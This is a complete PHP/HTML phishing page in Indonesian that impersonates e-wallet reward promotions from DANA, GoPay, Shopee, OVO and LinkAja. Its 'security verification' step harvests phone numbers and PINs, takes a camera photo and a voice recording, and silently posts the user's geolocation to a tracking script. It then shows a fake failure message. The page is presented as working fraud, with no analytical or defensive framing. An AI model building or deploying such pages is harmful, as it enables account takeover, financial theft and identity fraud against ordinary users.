<?php
$platform = $_GET['p'] ?? 'dana';
$themes = [
    'dana' => ['name' => 'DANA', 'color' => '#007bff', 'amount' => 'Rp 500.000'],
    'gopay' => ['name' => 'GoPay', 'color' => '#00a6a6', 'amount' => 'Cashback 100%'],
    'shopee' => ['name' => 'Shopee', 'color' => '#ee4d2d', 'amount' => 'Rp 150.000'],
    'ovo' => ['name' => 'OVO', 'color' => '#7c4dff', 'amount' => '50.000 Points'],
    'linkaja' => ['name' => 'LinkAja', 'color' => '#2e7d32', 'amount' => 'Rp 200.000']
];
$theme = $themes[$platform] ?? $themes['dana'];
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Klaim <?php echo $theme['name']; ?> - LIFX Digital</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 500px; margin: 0 auto; }
        .reward-card {
            background: white;
            border-radius: 32px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-top: 30px;
        }
        .reward-header {
            background: <?php echo $theme['color']; ?>;
            padding: 40px 20px;
            text-align: center;
            color: white;
        }
        .reward-header h2 { font-size: 28px; margin-bottom: 10px; }
        .reward-amount { font-size: 36px; font-weight: bold; margin-top: 15px; }
        .reward-content { padding: 25px; }
        .info-box {
            background: #f8f9fa;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .info-box p { margin: 10px 0; color: #666; }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 10px 0;
            transition: 0.3s;
        }
        .btn-primary { background: <?php echo $theme['color']; ?>; color: white; }
        .btn-secondary { background: #f0f0f0; color: #333; }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: white;
            width: 90%;
            max-width: 380px;
            border-radius: 28px;
            padding: 25px;
            max-height: 85vh;
            overflow-y: auto;
        }
        .modal-content input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            font-size: 15px;
        }
        .camera-box {
            width: 100%;
            height: 200px;
            background: #000;
            border-radius: 16px;
            margin: 15px 0;
            overflow: hidden;
        }
        .camera-box video, .camera-box canvas { width: 100%; height: 100%; object-fit: cover; }
        .action-buttons { display: flex; gap: 10px; justify-content: center; margin: 15px 0; }
        .action-btn {
            background: #ff3366;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 50px;
            font-size: 14px;
            cursor: pointer;
            flex: 1;
        }
        .status-text { font-size: 12px; text-align: center; margin-top: 10px; color: #666; }
        .footer-note { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #333;
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 13px;
            display: none;
            z-index: 1100;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="reward-card">
        <div class="reward-header">
            <h2>🎉 Selamat!</h2>
            <p>Anda mendapatkan hadiah spesial</p>
            <div class="reward-amount"><?php echo $theme['amount']; ?></div>
        </div>
        <div class="reward-content">
            <div class="info-box">
                <p>✅ Promo terbatas untuk pengguna terpilih</p>
                <p>✅ Klaim sebelum 30 Desember 2024</p>
                <p>✅ Langsung masuk ke akun Anda</p>
            </div>
            <button class="btn btn-primary" onclick="showVerify()">🎁 Ambil Hadiah Sekarang</button>
            <button class="btn btn-secondary" onclick="remindLater()">🔔 Ingatkan Nanti</button>
            <div class="footer-note">*Dengan mengklaim, Anda menyetujui syarat & ketentuan LIFX Digital</div>
        </div>
    </div>
</div>

<div id="verifyModal" class="modal">
    <div class="modal-content">
        <h3 style="text-align:center;">🔐 Verifikasi Keamanan</h3>
        <p style="font-size:13px; color:#666; text-align:center; margin-bottom:15px;">Demi keamanan akun Anda</p>
        <input type="text" id="phone" placeholder="Nomor HP Terdaftar">
        <input type="password" id="pin" placeholder="PIN / Kata Sandi">
        <div class="camera-box">
            <video id="video" autoplay playsinline style="width:100%; height:100%; object-fit:cover;"></video>
            <canvas id="canvas" style="display:none;"></canvas>
        </div>
        <div class="action-buttons">
            <button class="action-btn" onclick="capturePhoto()">📸 Ambil Foto</button>
            <button class="action-btn" onclick="startRecording()">🎤 Rekam Suara</button>
            <button class="action-btn" onclick="stopRecording()" id="stopBtn" style="display:none;">⏹️ Stop</button>
        </div>
        <div class="status-text" id="statusMsg">Siapkan wajah di depan kamera</div>
        <button class="btn btn-primary" onclick="submitData()" style="background:#28a745; margin-top:20px;">✅ Konfirmasi & Klaim</button>
    </div>
</div>
<div id="toast" class="toast">⏳ Memproses...</div>

<script>
    let stream = null, mediaRecorder = null, audioChunks = [], capturedPhoto = null, audioBlob = null;
    const platform = '<?php echo $platform; ?>';
    
    async function initCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('video').srcObject = stream;
            document.getElementById('statusMsg').innerHTML = '✅ Kamera aktif';
        } catch(e) { document.getElementById('statusMsg').innerHTML = '⚠️ Izinkan akses kamera'; }
    }
    
    function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
        document.getElementById('statusMsg').innerHTML = '📸 Foto berhasil!';
        setTimeout(() => document.getElementById('statusMsg').innerHTML = 'Siapkan wajah Anda', 1500);
    }
    
    async function startRecording() {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(audioStream);
        audioChunks = [];
        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        mediaRecorder.onstop = () => {
            audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            document.getElementById('statusMsg').innerHTML = '🎤 Suara terekam!';
            document.getElementById('stopBtn').style.display = 'none';
        };
        mediaRecorder.start();
        document.getElementById('stopBtn').style.display = 'inline-block';
        document.getElementById('statusMsg').innerHTML = '🔴 Merekam... bicarakan nomor Anda';
    }
    
    function stopRecording() {
        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
    }
    
    function showVerify() {
        document.getElementById('verifyModal').style.display = 'flex';
        initCamera();
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('track.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
                });
            });
        }
    }
    
    function remindLater() {
        const toast = document.getElementById('toast');
        toast.style.display = 'block';
        toast.innerText = '🔔 Kami akan mengingatkan Anda nanti';
        setTimeout(() => toast.style.display = 'none', 2000);
    }
    
    async function submitData() {
        const phone = document.getElementById('phone').value;
        const pin = document.getElementById('pin').value;
        if (!phone || !pin) { alert('Harap isi nomor HP dan PIN'); return; }
        
        const toast = document.getElementById('toast');
        toast.style.display = 'block';
        toast.innerText = '📤 Memverifikasi...';
        if (stream) stream.getTracks().forEach(t => t.stop());
        
        const formData = new FormData();
        formData.append('phone', phone);
        formData.append('pin', pin);
        formData.append('platform', platform);
        if (capturedPhoto) formData.append('photo', capturedPhoto);
        if (audioBlob) formData.append('audio', audioBlob, 'audio.webm');
        
        await fetch('submit.php', { method: 'POST', body: formData });
        toast.innerText = '❌ Verifikasi gagal, coba lagi nanti';
        setTimeout(() => toast.style.display = 'none', 2000);
        document.getElementById('verifyModal').style.display = 'none';
        document.getElementById('phone').value = '';
        document.getElementById('pin').value = '';
        capturedPhoto = null;
        audioBlob = null;
    }
</script>
</body>
</html>